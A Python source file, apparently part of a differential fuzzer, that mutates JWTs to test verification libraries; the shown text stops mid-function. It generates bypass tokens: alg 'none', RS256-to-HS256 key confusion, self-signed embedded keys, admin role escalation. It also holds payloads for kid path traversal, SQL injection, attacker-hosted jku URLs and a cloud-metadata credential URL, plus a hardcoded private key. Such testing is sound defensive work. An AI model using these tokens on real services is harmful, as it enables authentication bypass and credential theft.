"""JWT/JWS taxonomy-driven mutator.

Targets JWT verification and authorization differentials across libraries:
  J1  Algorithm manipulation        -> none, unknown alg, HS confusion, RS→HS
  J2  Header parameter injection    -> kid, jku, jwk (self-signed RSA), x5c, typ, cty, crit, b64
  J3  Claim semantic confusion      -> sub, iss, aud, role, scope, time
  J4  Parser differentials          -> duplicate keys, non-canonical base64url
  J5  Token type confusion          -> nested JWT hints, typ/cty swaps
  J6  JWE token wrapping            -> 5-segment JWE with nested JWS inner
  J7  Keyless attacks               -> embedded JWK self-signed, alg confusion, JWS/JWE confusion

Unlike generic token mutation, this mutator operates on compact JWTs and
re-signs HS* tokens so mutated inputs can still reach deep verifier states.
JWE strategies wrap JWS tokens as mock 5-segment JWE for pac4j-like targets.
Keyless attack strategies (J7) generate tokens that bypass verification
without knowing the server's secret, targeting §1-2, §2-3, §2-4, §7-1
from the JWT mutation taxonomy.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import random
import time as _time
from typing import TYPE_CHECKING, Any

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

DEFAULT_HS_SECRET = b"secret"
MAX_OUTPUT_SIZE = 8192
EVIL_SENTINEL = "evil-sentinel-9z9"

# ---------------------------------------------------------------------------
# Fixed RSA keypair for targets configured with RS256.
# The public key is "known" to the attacker (like OIDC /.well-known/jwks.json).
# Used by algorithm confusion (§1-2) and JWS/JWE confusion (§7-1).
# ---------------------------------------------------------------------------
RSA_TARGET_PUBLIC_KEY_PEM = (
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmYZu2CPMrFIitVfZx11f\n"
    "S9iPLlOuS5yFApFK4/kbyNEWt2aGEI3pgs36GB9uodriS4wVAk+Y/f59fSn0kwjJ\n"
    "ptFI4Jqvq+96ncNVVmj0Swf/k3W5zN30nGhfgL1gUp8AdWEAfiFif37u+4JWOJ0S\n"
    "pcBAfNEHCylzbgribR9I/EkaO0sl8d6yvKxKLB6mxlBZfTNZlVKHyq5VRlzPGLUj\n"
    "T4/YtiJws86VvabuBdNfjAIYZc3j+mRQPwGU94lapioC+toVLpZ9MwvqP8JmypVf\n"
    "iNTuIny4kZVBk0+vNt5Tzzw7QJZpk8Kzs7WxvRnKqRoR3SJEQcYcFiHaOWIeVEh\n"
    "YCQIDAQAB\n"
    "-----END PUBLIC KEY-----\n"
)
RSA_TARGET_PRIVATE_KEY_PEM = (
    "-----BEGIN PRIVATE KEY-----\n"
    "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCZhm7YI8ysUiK1\n"
    "V9nHXV9L2I8uU65LnIUCkUrj+RvI0Ra3ZoYQjemCzfoYH26h2uJLjBUCT5j9/n19\n"
    "KfSTCMmm0Ujgmq+r73qdw1VWaPRLB/+TdbnM3fScaF+AvWBSnwB1YQB+IWJ/fu77\n"
    "glY4nRKlwEB80QcLKXNuCuJtH0j8SRo7SyXx3rK8rEosHqbGUFl9M1mVUofKrlVG\n"
    "XM8YtSNPj9i2InCzzpW9pu4F01+MAhhlzeP6ZFA/AZT3iVqmKgL62hUuln0zC+o/\n"
    "wmbKlV+I1O4ifLiRlUGTT6823lPPPDtAlmmTwrOztbG9GcqpGhHdIkRBxhwWIdo5\n"
    "Yh5USFgJAgMBAAECggEAGzmx0naWx0BRk2Me5bHzQloHGioQ0KvTEp99bmwwty4N\n"
    "Hzz5LVpdPKsWXMzGK8HLO6Z920kOUoyc6GNWUfTO/dxDVkFYQd9YGT4YlhhKqjui\n"
    "4R2Rc3kw9cO0m/n5aO11gVtQYQ2+j+mMq+FzNNr2AZrUVM4kt6AELlGT0dIoeUSf\n"
    "D9QbkWRlcWktNcEunB7z+rRX9CM9BiBTgLCfOz8Gfgb1aDpN74MOwm9eLUSosNjh\n"
    "nE+6SMAimtPG2+O4ES2n63a0hLQPZZJrZOIoHtL/uMR1Jgy/1CF6rTsUYiID/cQM\n"
    "j8W41EN6a+cp4LwrDubay5cVrbYY5EWsv+PVB4I8+QKBgQDQxfk5TbI9IadAKFBV\n"
    "hgA2Ymzli8MtULMIqjd9BIyLP+iAVOU8GXCthJ5iaRldf3P7rG0BDZ9Rjh0nmqtB\n"
    "y2h80eRMJgpZmkER836839Tfcuj+aVpdxFEDXF2196nKyLfhLhYnlHZZ28ZNiQD3\n"
    "Jkw8wcN/rO7go1fIdiUF2QD5jwKBgQC8QQu3CcOMKmctuPLrJgWu2kXBhLWy/uhz\n"
    "wHznB42pFkYhMpeDa5pujkaawL6idkBCDlRzMUPMLvevlXb3fE85CkjUBBXOiTN/\n"
    "MPXiub0j4ozecVPrJg0oQolw6nrX4zqCbhV07KgOnLw0fq4WRhlZLBHG5hT7sY3p\n"
    "o4G2TIJY5wKBgQC/0DTz/ju1yNa2rpNokE5fqTyuBiQT3WIwotuKZISQZ+5BAj7/\n"
    "YcxR0FgIyNFCQxiX8crQvehT8QM+YO/Z6n4cuGdNw2GdA4mnaZVXCTu29Qe2v6sE\n"
    "HZvlP5bl2h9JLfMr08ENKm02kCL5F9goOyquY8Qv6P4srEa56jqHzeIEZwKBgCo5\n"
    "vNL1kbMi37nVvkcYZDXwJ61cgxT/MEymZF29x/yhTmGr42hK/nzF1PhpO1ldhNRM\n"
    "Oo0MA9UMw+nScLjaXTrCH8vOjsWg6Lgi10RfvRkLe+V5LgWUp2bcZc+6CIvcIAeZ\n"
    "gZ6UZq3AYka0E4BTgOQLioE+on5COT6qujGVv7cJAoGBAKzXRjslrnwrXUkl/tP+\n"
    "kNzNTIAvaPu8y0F9+OYWJsDxyId/l3BUFY8IbSnx1AOGPECQYoESnwZm4zqypeet\n"
    "ctQOMW4xTua4ASGm9F4m3tNjoAaUJRQvTLRUHsN4Sf0mSGA/AUx1HwnG/0RWbsQw\n"
    "h5J3pXffJY4yolvmOE74Wy7w\n"
    "-----END PRIVATE KEY-----\n"
)

# ---------------------------------------------------------------------------
# Attacker-generated RSA keypair for self-signed JWK attacks (§2-3).
# Different from target keys — attacker creates their own and embeds it.
# Lazy-loaded to avoid import-time overhead when jwt mutator isn't used.
# ---------------------------------------------------------------------------
_attacker_rsa_private_key = None
_attacker_rsa_public_numbers = None


def _get_attacker_rsa_key():
    """Lazy-load attacker RSA keypair (generated once per process)."""
    global _attacker_rsa_private_key, _attacker_rsa_public_numbers
    if _attacker_rsa_private_key is None:
        from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
        _attacker_rsa_private_key = _rsa.generate_private_key(
            public_exponent=65537, key_size=2048,
        )
        _attacker_rsa_public_numbers = (
            _attacker_rsa_private_key.public_key().public_numbers()
        )
    return _attacker_rsa_private_key, _attacker_rsa_public_numbers


def _rsa_sign_rs256(signing_input: bytes, private_key) -> bytes:
    """Sign with RS256 (RSASSA-PKCS1-v1_5 + SHA-256)."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return _b64url_encode(signature)


def _rsa_pub_to_jwk(pub_numbers, kid: str = "attacker-key-1") -> dict:
    """Convert RSA public numbers to JWK dict."""
    n_bytes = pub_numbers.n.to_bytes((pub_numbers.n.bit_length() + 7) // 8, "big")
    e_bytes = pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, "big")
    return {
        "kty": "RSA",
        "n": _b64url_encode(n_bytes).decode("ascii"),
        "e": _b64url_encode(e_bytes).decode("ascii"),
        "kid": kid,
        "use": "sig",
        "alg": "RS256",
    }

CLAIM_TYPE_CONFUSION_VARIANTS = [
    ("sub", True, "boolean_true"), ("sub", None, "null"),
    ("sub", 12345, "number"), ("sub", ["user-123"], "array"),
    ("sub", {"name": "admin"}, "object"),
    ("exp", "1893456000", "string_exp"), ("exp", -1, "negative_exp"),
    ("exp", 0, "zero_exp"), ("exp", 9007199254740993, "overflow_exp"),
    ("iss", 12345, "number_iss"), ("aud", [["inner"]], "nested_array_aud"),
    ("alg", None, "null_alg"), ("alg", True, "boolean_alg"),
    ("alg", 256, "integer_alg"), ("alg", "", "empty_string_alg"),
]
NULL_BYTE_PAYLOADS = [
    ("sub", "admin\u0000.user", "null_truncation"),
    ("sub", "\u200Badmin", "zero_width_space"),
    ("sub", "admin\u200B", "trailing_zwsp"),
    ("kid", "key-1\u0000../../etc/passwd", "kid_null_traversal"),
    ("sub", "admin\u0000", "trailing_null"),
    ("iss", "https://issuer.example\u0000.evil.com", "iss_null_truncation"),
]

NONE_VARIANTS = [b"none", b"None", b"NONE", b"nOnE"]
UNKNOWN_ALGS = [b"zzz", b"foo", b"HS1024", b"RS0"]
ASYM_TO_HMAC_ALGS = [b"HS256", b"HS384", b"HS512"]
TYP_VARIANTS = [b"JWT", b"at+jwt", b"dpop+jwt", b"JOSE", b""]
CTY_VARIANTS = [b"JWT", b"application/json", b"text/xml", b""]
KID_PAYLOADS = [
    b"../../../../dev/null",
    b"../../../etc/hostname",
    b"' UNION SELECT 'secret' --",
    b"../../../../proc/self/environ",
    b"",
    b"kid-rotated",
]
JKU_PAYLOADS = [
    b"https://attacker.example/jwks.json",
    b"https://trusted.example.com@attacker.example/jwks.json",
    b"https://trusted.example.com#@attacker.example/jwks.json",
    b"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
]
X5U_PAYLOADS = [
    b"https://attacker.example/cert.pem",
    b"http://127.0.0.1/internal-cert.pem",
]
ROLE_VALUES = [b"user", b"admin", b"superadmin"]
SCOPE_VALUES = [b"read", b"read write", b"read write admin", b"openid profile email"]
ISS_VALUES = [
    b"https://issuer.example",
    b"https://evil-issuer.example",
    b"",
]
AUD_VALUES = [
    b"https://api.example",
    b"https://admin.example",
    b"",
]


def _b64url_encode(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def _b64url_decode(data: bytes) -> bytes:
    padding = b"=" * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data + padding)


def _json_dumps_bytes(obj: Any) -> bytes:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=True).encode("utf-8")


def _sign_hs(alg: str, signing_input: bytes, secret: bytes) -> bytes:
    digest_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    digestmod = digest_map.get(alg)
    if digestmod is None:
        return b""
    return _b64url_encode(hmac.new(secret, signing_input, digestmod).digest())


def _parse_compact_jwt(data: bytes) -> tuple[list[bytes], dict[str, Any], dict[str, Any]] | None:
    parts = data.strip().split(b".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError, TypeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return parts, header, payload


def _seed_token(secret: bytes = DEFAULT_HS_SECRET, evil_sub: bool = False) -> bytes:
    header = {"alg": "HS256", "typ": "JWT", "kid": "kid-1"}
    payload = {
        "sub": EVIL_SENTINEL if evil_sub else "user-123",
        "iss": "https://issuer.example",
        "aud": "https://api.example",
        "role": "user",
        "scope": "read",
        "exp": 1893456000,
        "iat": 1704067200,
        "nbf": 1704067200,
    }
    header_raw = _json_dumps_bytes(header)
    payload_raw = _json_dumps_bytes(payload)
    signing_input = _b64url_encode(header_raw) + b"." + _b64url_encode(payload_raw)
    sig = _sign_hs("HS256", signing_input, secret)
    return signing_input + b"." + sig


def _wrap_as_jwe(
    inner_token: bytes,
    outer_header_extra: dict[str, Any] | None = None,
) -> bytes:
    """Wrap a JWS inner token as a mock 5-segment JWE.

    pac4j_like.js decodes parts[3] (ciphertext position) as base64url and
    treats the result as the nested JWT string.  No real encryption.
    """
    outer_header: dict[str, Any] = {"alg": "RSA-OAEP", "enc": "A256GCM", "cty": "JWT"}
    if outer_header_extra:
        outer_header.update(outer_header_extra)
    return (
        _b64url_encode(_json_dumps_bytes(outer_header))
        + b"."
        + _b64url_encode(b"")              # encrypted key (empty)
        + b"."
        + _b64url_encode(b"\x00" * 12)     # IV
        + b"."
        + _b64url_encode(inner_token)       # "ciphertext" = nested JWT
        + b"."
        + _b64url_encode(b"\x00" * 16)     # auth tag
    )


class JwtMutator:
    """JWT/JWS taxonomy-driven mutator."""

    name = "jwt"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        self._strategies: list = [
            self._alg_none,
            self._alg_none_case_variant,
            self._alg_unknown_empty_sig,
            self._alg_rs_to_hs_confusion,
            self._alg_es_to_hs_confusion,
            self._kid_path_injection,
            self._kid_sql_injection,
            self._jku_injection,
            self._embedded_jwk,
            self._x5u_injection,
            self._typ_confusion,
            self._cty_nested,
            self._duplicate_kid_header,
            self._duplicate_role_claim,
            self._issuer_array_injection,
            self._aud_array_injection,
            self._exp_remove,
            self._exp_far_future,
            self._nbf_backdate,
            self._role_escalation,
            self._scope_expansion,
            self._b64_false_crit,
            self._noncanonical_payload_encoding,
            # J5 — encoding / parser edge cases (subtle library bugs)
            self._utf8_bom_payload,
            self._unicode_escape_sub,
            self._alg_whitespace_variant,
            self._base64url_with_padding,
            self._base64url_standard_chars,
            self._exp_boundary,
            self._extra_dot_segment,
            self._scientific_notation_exp,
            # J6 — JWE 5-segment wrapping (for pac4j-like targets)
            self._jwe_wrap_valid_inner,
            self._jwe_wrap_alg_none_inner,
            self._jwe_wrap_cty_missing,
            self._jwe_wrap_kid_injection,
            self._jwe_wrap_duplicate_inner,
            # J7 — Keyless attacks (§1-2, §2-3, §2-4, §7-1 from taxonomy)
            self._jwk_selfsigned_rsa,
            self._alg_confusion_rs256_to_hs256,
            self._x5c_selfsigned,
            self._jws_jwe_confusion,
            # J8 — RFC gap exploitation (spec ambiguity → real CVEs)
            self._duplicate_alg_header,
            self._claim_type_confusion,
            self._duplicate_sub_claim,
            self._lenient_json_parsing,
            self._null_byte_injection,
            self._b64_type_variants,
            self._duplicate_exp_type_confused,
            self._crit_edge_cases,
            self._exp_negative_and_zero,
            self._base64_whitespace,
            self._missing_alg_header,
            self._segment_count_variants,
            # J9 — CVE-driven attack vectors (NDSS 2026, BH2023, real CVEs)
            self._zip_in_jws,
            self._iss_mixed_array,
            self._deeply_nested_claims,
            self._pkcs1_pem_confusion,
            self._zip_variant_headers,
            # J10 — Fuzzer gap coverage (PBES2 DoS, algorithm downgrade)
            self._pbes2_p2c_dos,
            self._alg_downgrade,
        ]
        self._strategy_names = [fn.__name__.lstrip("_") for fn in self._strategies]
        self._base_weights = [
            # J1: alg manipulation
            9, 7, 8, 3, 3,
            # J2: header injection
            8, 7, 8, 8, 6,
            7, 7, 8, 9, 7,
            # J3: claim confusion
            7, 6, 6, 5, 8,
            8, 7, 5,
            # J5: encoding edge cases (high priority for real lib bugs)
            6, 6, 6, 6, 6, 6, 5, 5,
            # J6: JWE wrapping (downweighted without pac4j in diff set)
            2, 2, 2, 2, 2,
            # J7: Keyless attacks (HIGH priority — these find real vulns)
            10, 10, 8, 8,
            # J8: RFC gap exploitation (spec ambiguity → real CVEs)
            10, 9, 9, 8, 8, 8, 8, 7, 7, 6, 6, 5,
            # J9: CVE-driven attack vectors (NDSS 2026, BH2023)
            9, 9, 7, 7, 6,
            # J10: Fuzzer gap coverage (PBES2 DoS, algorithm downgrade)
            8, 8,
        ]
        self._weights = list(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategies)
        self._strategy_cov: list[int] = [0] * len(self._strategies)
        self._total_feedback_calls: int = 0

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        del corpus
        data = inp.data.strip()
        parts_count = len(data.split(b"."))

        # Sentinel injection: 10% of mutations inject evil sub for exploit_confidence scoring
        use_sentinel = self.rng.random() < 0.10

        # Route: 5-segment JWE passthrough, 3-segment JWS parse, else seed
        if parts_count == 5:
            base = data
            is_jwe = True
        elif _parse_compact_jwt(data) is not None:
            base = data
            is_jwe = False
        else:
            base = _seed_token(self._resolve_secret(inp.metadata), evil_sub=use_sentinel)
            is_jwe = False

        token = base
        applied: list[str] = []
        resigned = False

        # Boost JWE strategies when input is already JWE; dampen for JWS inputs
        if is_jwe:
            weights = [
                w if name.startswith("jwe_") else max(1, w // 3)
                for name, w in zip(self._strategy_names, self._weights)
            ]
        else:
            weights = self._weights

        for _ in range(self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]):
            idx = self.rng.choices(range(len(self._strategies)), weights=weights, k=1)[0]
            new_token, did_resign = self._strategies[idx](token, inp.metadata)
            if new_token and len(new_token) <= MAX_OUTPUT_SIZE:
                token = new_token
                applied.append(self._strategy_names[idx])
                resigned = resigned or did_resign

        return Input(
            data=token[:MAX_OUTPUT_SIZE],
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
                "resigned": resigned,
                "jwt_evil_sentinel": EVIL_SENTINEL if use_sentinel else None,
            },
        )

    def _resolve_secret(self, metadata: dict[str, Any], prefer_public: bool = False) -> bytes:
        if prefer_public and metadata.get("jwt_public_key"):
            value = metadata["jwt_public_key"]
            return value.encode("utf-8") if isinstance(value, str) else bytes(value)
        if metadata.get("jwt_hs_secret"):
            value = metadata["jwt_hs_secret"]
            return value.encode("utf-8") if isinstance(value, str) else bytes(value)
        return DEFAULT_HS_SECRET

    def _assemble(
        self,
        header_raw: bytes,
        payload_raw: bytes,
        metadata: dict[str, Any],
        *,
        prefer_public_key_secret: bool = False,
    ) -> tuple[bytes, bool]:
        try:
            header_obj = json.loads(header_raw)
        except json.JSONDecodeError:
            header_obj = {}
        alg = str(header_obj.get("alg", "HS256"))
        signing_input = _b64url_encode(header_raw) + b"." + _b64url_encode(payload_raw)
        if alg.lower() == "none":
            return signing_input + b".", False
        if alg in {"HS256", "HS384", "HS512"}:
            sig = _sign_hs(alg, signing_input, self._resolve_secret(metadata, prefer_public_key_secret))
            return signing_input + b"." + sig, True
        return signing_input + b".", False

    def _parts(self, token: bytes) -> tuple[list[bytes], dict[str, Any], dict[str, Any]]:
        parsed = _parse_compact_jwt(token)
        if parsed is None:
            token = _seed_token()
            parsed = _parse_compact_jwt(token)
        assert parsed is not None
        return parsed

    def _alg_none(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, _, payload = self._parts(token)
        header_raw = b'{"alg":"none","typ":"JWT"}'
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _alg_none_case_variant(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, _, payload = self._parts(token)
        variant = self.rng.choice(NONE_VARIANTS).decode("ascii")
        header_raw = _json_dumps_bytes({"alg": variant, "typ": "JWT"})
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _alg_unknown_empty_sig(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, _, payload = self._parts(token)
        alg = self.rng.choice(UNKNOWN_ALGS).decode("ascii")
        header_raw = _json_dumps_bytes({"alg": alg, "typ": "JWT"})
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _alg_rs_to_hs_confusion(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header.update({"alg": "HS256", "typ": header.get("typ", "JWT")})
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata, prefer_public_key_secret=True)

    def _alg_es_to_hs_confusion(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header.update({"alg": self.rng.choice([a.decode("ascii") for a in ASYM_TO_HMAC_ALGS]), "typ": header.get("typ", "JWT")})
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata, prefer_public_key_secret=True)

    def _kid_path_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["kid"] = self.rng.choice(KID_PAYLOADS[:4]).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _kid_sql_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["kid"] = KID_PAYLOADS[2].decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _jku_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["jku"] = self.rng.choice(JKU_PAYLOADS).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _embedded_jwk(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["jwk"] = {
            "kty": "oct",
            "kid": header.get("kid", "kid-embedded"),
            "k": _b64url_encode(self._resolve_secret(metadata)).decode("ascii"),
        }
        header["alg"] = "HS256"
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _x5u_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["x5u"] = self.rng.choice(X5U_PAYLOADS).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _typ_confusion(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["typ"] = self.rng.choice(TYP_VARIANTS).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _cty_nested(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header["cty"] = self.rng.choice(CTY_VARIANTS).decode("utf-8", errors="replace")
        payload["nested"] = _seed_token(self._resolve_secret(metadata)).decode("ascii")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _duplicate_kid_header(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        alg = header.get("alg", "HS256")
        header_raw = (
            b'{"alg":"' + str(alg).encode("ascii", errors="ignore") + b'","typ":"JWT",'
            b'"kid":"kid-1","kid":"../../../../dev/null"}'
        )
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _duplicate_role_claim(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        subject = str(payload.get("sub", "user-123")).encode("utf-8")
        payload_raw = (
            b'{"sub":"' + subject + b'","role":"user","role":"admin",'
            b'"iss":"https://issuer.example","aud":"https://api.example"}'
        )
        return self._assemble(_json_dumps_bytes(header), payload_raw, metadata)

    def _issuer_array_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload_raw = (
            b'{"sub":"' + str(payload.get("sub", "user-123")).encode("utf-8") + b'",'
            b'"iss":["https://issuer.example","https://evil-issuer.example"],'
            b'"aud":"https://api.example"}'
        )
        return self._assemble(_json_dumps_bytes(header), payload_raw, metadata)

    def _aud_array_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload["aud"] = [
            self.rng.choice(AUD_VALUES).decode("utf-8", errors="replace"),
            "https://api.example",
        ]
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _exp_remove(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload.pop("exp", None)
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _exp_far_future(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload["exp"] = 4102444800
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _nbf_backdate(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload["nbf"] = 0
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _role_escalation(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload["role"] = self.rng.choice(ROLE_VALUES).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _scope_expansion(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        payload["scope"] = self.rng.choice(SCOPE_VALUES).decode("utf-8", errors="replace")
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _b64_false_crit(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        _, header, payload = self._parts(token)
        header_raw = _json_dumps_bytes({
            "alg": "HS256",
            "typ": header.get("typ", "JWT"),
            "b64": False,
            "crit": ["b64"],
        })
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _noncanonical_payload_encoding(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Test parser tolerance for non-canonical base64url.

        Does NOT re-sign — the signature mismatch tests whether parsers
        normalize encoding before or after signature verification.
        """
        parts, header, payload = self._parts(token)
        payload_raw = _json_dumps_bytes(payload)
        canonical = _b64url_encode(payload_raw)
        variant = self.rng.randint(0, 2)
        if variant == 0:
            # Extra padding (some parsers strip, others reject)
            payload_seg = canonical + b"="
        elif variant == 1:
            # Standard base64 chars instead of base64url (+ instead of -)
            payload_seg = canonical.replace(b"-", b"+")
        else:
            # Uppercase all base64 chars
            payload_seg = canonical.upper()
        # Keep original header and signature — do NOT re-sign
        return parts[0] + b"." + payload_seg + b"." + parts[2], False

    # ------------------------------------------------------------------ #
    # J5 — Encoding & parser edge-case strategies                        #
    # ------------------------------------------------------------------ #

    def _utf8_bom_payload(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Insert UTF-8 BOM before payload JSON — some parsers strip, others reject."""
        _, header, payload = self._parts(token)
        payload_raw = b"\xef\xbb\xbf" + _json_dumps_bytes(payload)
        return self._assemble(_json_dumps_bytes(header), payload_raw, metadata)

    def _unicode_escape_sub(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Use \\uXXXX JSON escapes in sub claim — tests normalization before extraction."""
        _, header, payload = self._parts(token)
        sub = str(payload.get("sub", "user-123"))
        escaped = "".join(f"\\u{ord(c):04x}" for c in sub)
        payload_raw = (
            b'{"sub":"' + escaped.encode("ascii") + b'",'
            b'"role":"' + str(payload.get("role", "user")).encode() + b'",'
            b'"exp":1893456000,"iss":"https://issuer.example","aud":"https://api.example"}'
        )
        return self._assemble(_json_dumps_bytes(header), payload_raw, metadata)

    def _alg_whitespace_variant(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Algorithm string with whitespace or null — tests trim before lookup."""
        _, _, payload = self._parts(token)
        variants = [" HS256", "HS256 ", "\tHS256", "HS256\x00", "\x00HS256"]
        variant = self.rng.choice(variants)
        header_raw = _json_dumps_bytes({"alg": variant, "typ": "JWT"})
        return self._assemble(header_raw, _json_dumps_bytes(payload), metadata)

    def _base64url_with_padding(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Add base64 padding chars — RFC 7515 says MUST omit, tests strictness."""
        parts, header, payload = self._parts(token)
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        padded = header_b64 + b"=" * self.rng.randint(1, 2)
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        signing_input = padded + b"." + payload_b64
        sig = _sign_hs("HS256", signing_input, self._resolve_secret(metadata))
        return signing_input + b"." + sig, True

    def _base64url_standard_chars(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Use + and / instead of - and _ — tests URL-safe requirement."""
        parts, header, payload = self._parts(token)
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        payload_b64_std = payload_b64.replace(b"-", b"+").replace(b"_", b"/")
        # Keep original sig — mismatch tests parser normalization
        return parts[0] + b"." + payload_b64_std + b"." + parts[2], False

    def _exp_boundary(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Set exp at current time boundary — tests race conditions and clock tolerance."""
        _, header, payload = self._parts(token)
        now = int(_time.time())
        offset = self.rng.choice([0, 1, -1, 2, -2, 60, -60])
        payload["exp"] = now + offset
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _extra_dot_segment(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """4-segment token — ambiguous, neither JWS nor JWE."""
        _, header, payload = self._parts(token)
        signing_input = _b64url_encode(_json_dumps_bytes(header)) + b"." + _b64url_encode(_json_dumps_bytes(payload))
        sig = _sign_hs("HS256", signing_input, self._resolve_secret(metadata))
        return signing_input + b"." + sig + b"." + _b64url_encode(b"extra"), True

    def _scientific_notation_exp(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """Use scientific notation for exp — valid JSON but some parsers differ."""
        _, header, payload = self._parts(token)
        sub = str(payload.get("sub", "user-123"))
        payload_raw = (
            b'{"sub":"' + sub.encode("utf-8") + b'",'
            b'"exp":1.893456e9,'
            b'"iss":"https://issuer.example","aud":"https://api.example",'
            b'"role":"' + str(payload.get("role", "user")).encode() + b'"}'
        )
        return self._assemble(_json_dumps_bytes(header), payload_raw, metadata)

    # ------------------------------------------------------------------ #
    # J6 — JWE 5-segment wrapping strategies                             #
    # ------------------------------------------------------------------ #

    def _jwe_wrap_valid_inner(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
